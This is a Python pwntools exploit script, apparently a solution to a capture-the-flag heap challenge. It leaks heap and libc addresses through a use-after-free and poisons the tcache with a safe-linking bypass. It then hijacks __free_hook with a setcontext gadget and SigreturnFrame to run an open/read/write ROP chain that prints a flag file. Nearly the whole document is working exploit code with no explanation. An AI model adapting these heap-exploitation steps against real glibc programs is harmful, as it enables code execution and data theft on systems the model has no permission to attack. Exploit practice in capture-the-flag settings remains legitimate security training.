#!/usr/bin/python3
#-*- coding: utf-8 -*-
from pwn import *

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

# remote_service = ""
# remote_service = remote_service.strip().split(":")
# p = remote(remote_service[0], int(remote_service[1]))
# p = remote("192.168.166.190", 58011)
filename = "./pwn"
p = process(filename)
e = ELF(filename, checksec=False)
l = ELF(e.libc.path, checksec=False)

rl = lambda a=False : p.recvline(a)
ru = lambda a,b=True : p.recvuntil(a,b)
rn = lambda x : p.recvn(x)
sn = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
irt = lambda : p.interactive()
dbg = lambda text=None : gdb.attach(p, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
i2b = lambda c : str(c).encode()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
	lg("p.pid")
	input()
	pass
def cmd(choice):
	ru(b'Choice: ')
	sl(i2b(choice))
def add():
	cmd(1)
def delete(idx):
	cmd(2)
	ru(b'Idx: \n')
	sl(i2b(idx))
def show(idx):
	cmd(3)
	ru(b'Idx: \n')
	sl(i2b(idx))
def edit(idx, content, size=0):
	if (size==0):
		size = len(content)
	cmd(4)
	ru(b'Idx: \n')
	sl(i2b(idx))
	ru(b'Size: \n')
	sl(i2b(size))
	ru(b'Content: \n')
	sn(content)

for i in range(9):		# 8
	add()
for i in range(8):
	delete(i)			# 7

show(0)
heap_xor = uu64(ru(b"\nDone", "drop"))
heap_base = heap_xor << 12
lg("heap_base")
edit(7, p8(1))
show(7)
libc_base = uu64(ru(b"\nDone", "drop")) - 0x1e0c01
lg("libc_base")
edit(7, p8(0))

free_hook_addr = libc_base + 0x1e3e20
magic_gadget = 0x14a0a0 + libc_base
set_context = 0x52970 + libc_base
pop_rax_ret = libc_base + 0x44c70
pop_rdi_ret = libc_base + 0x28a55
pop_rsi_ret = libc_base + 0x2a4cf
pop_rdx_ret = libc_base + 0xc7f32
p_rdx_r12_r = libc_base + 0x112a51
read_f = libc_base + l.symbols["read"]
write_f = libc_base + l.symbols["write"]
syscall = libc_base + 0x6105a
ret = libc_base + 0x26699

str_flag_addr = heap_base + 0x3b0 		# 1
rw_addr = heap_base + 0x4c0 			# 2
fake_frame_addr = free_hook_addr + 0x10

target = (heap_base + 0x100)^heap_xor
edit(6, p64(target))
add()
add()		# 10


edit(1, b"./flag\x00\x00")
rop_chain = b''
rop_chain += p64(pop_rdi_ret) + p64(str_flag_addr) # name = "./flag"
rop_chain += p64(pop_rsi_ret) + p64(0)
rop_chain += p64(pop_rdx_ret) + p64(0)
rop_chain += p64(pop_rax_ret) + p64(2) + p64(syscall) # sys_open
rop_chain += p64(pop_rdi_ret) + p64(3) # fd = 3
rop_chain += p64(pop_rsi_ret) + p64(rw_addr) # buf
rop_chain += p64(pop_rdx_ret) + p64(0x100) # len
rop_chain += p64(libc_base + l.symbols["read"])
rop_chain += p64(pop_rdi_ret) + p64(1) # fd = 1
rop_chain += p64(pop_rsi_ret) + p64(rw_addr) # buf
rop_chain += p64(pop_rdx_ret) + p64(0x100) # len
rop_chain += p64(libc_base + l.symbols["write"])
lg("len(rop_chain)")



# rop_chain = flat([
# 	libc_base + l.symbols['open'],
# 	p_rdx_r12_r,
# 	0x100,
# 	0x0,
# 	pop_rdi_ret,
# 	3,
# 	pop_rsi_ret,
# 	fake_frame_addr + 0x200,
# 	libc_base + l.symbols['read'],
# 	pop_rdi_ret,
# 	fake_frame_addr + 0x200,
# 	libc_base + l.symbols['puts']
# ])

frame = SigreturnFrame()
frame.rax = 0
frame.rdi = fake_frame_addr + 0xF8
frame.rsp = fake_frame_addr + 0xF8 + 0x10
frame.rip = ret

frame = bytes(frame).ljust(0xF8, b'\x00')
# print(frame)
payload = p64(magic_gadget) + p64(fake_frame_addr) + b'\x00' * 0x20 + p64(set_context + 61) + frame[0x28:] + b"flag\x00\x00\x00\x00" + p64(0) + rop_chain
# print(hex(len(payload)))

edit(10, p64(0) + p64(free_hook_addr))
add()
edit(11, payload[:0x100])

edit(10, p64(0) + p64(free_hook_addr + 0x100))
add()
edit(12, payload[0x100:])
debugPID()

delete(11)
# debugPID()
irt()
